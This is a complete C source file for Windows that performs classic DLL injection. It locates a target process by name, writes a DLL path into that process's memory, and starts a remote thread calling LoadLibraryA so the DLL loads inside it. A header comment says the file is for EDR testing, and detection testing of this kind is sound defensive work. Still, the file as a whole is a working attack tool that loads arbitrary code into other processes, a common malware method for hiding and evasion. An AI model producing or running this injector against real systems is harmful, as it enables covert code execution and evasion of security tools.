/*
 * Classic DLL Injection (CreateRemoteThread)
 * 
 * This technique injects a DLL into a target process by:
 * 1. Opening the target process
 * 2. Allocating memory in the target process
 * 3. Writing the DLL path to that memory
 * 4. Creating a remote thread that calls LoadLibraryA with the DLL path
 * 
 * For EDR testing purposes only.
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Function to find process ID by name
DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    DWORD pid = 0;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
        printf("Example: %s notepad.exe C:\\\\path\\\\to\\\\your.dll\n", argv[0]);
        return 1;
    }
    
    const char* processName = argv[1];
    const char* dllPath = argv[2];
    
    printf("[*] Classic DLL Injection Technique\n");
    printf("[*] Target Process: %s\n", processName);
    printf("[*] DLL Path: %s\n", dllPath);
    
    // Step 1: Get target process ID
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        printf("[!] Error: Process '%s' not found\n", processName);
        return 1;
    }
    printf("[+] Found process with PID: %d\n", pid);
    
    // Step 2: Open target process with required permissions
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );
    
    if (hProcess == NULL) {
        printf("[!] Error: Failed to open process. Error: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Process handle obtained\n");
    
    // Step 3: Allocate memory in target process for DLL path
    SIZE_T dllPathSize = strlen(dllPath) + 1;
    LPVOID pRemoteDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (pRemoteDllPath == NULL) {
        printf("[!] Error: Failed to allocate memory. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Memory allocated at: 0x%p\n", pRemoteDllPath);
    
    // Step 4: Write DLL path to allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteDllPath, dllPath, dllPathSize, &bytesWritten)) {
        printf("[!] Error: Failed to write DLL path. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] DLL path written (%zu bytes)\n", bytesWritten);
    
    // Step 5: Get address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    
    if (pLoadLibraryA == NULL) {
        printf("[!] Error: Failed to get LoadLibraryA address\n");
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] LoadLibraryA address: 0x%p\n", pLoadLibraryA);
    
    // Step 6: Create remote thread to execute LoadLibraryA
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryA,
        pRemoteDllPath,
        0,
        NULL
    );
    
    if (hThread == NULL) {
        printf("[!] Error: Failed to create remote thread. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote thread created\n");
    
    // Step 7: Wait for thread completion
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] DLL injection completed successfully\n");
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return 0;
}
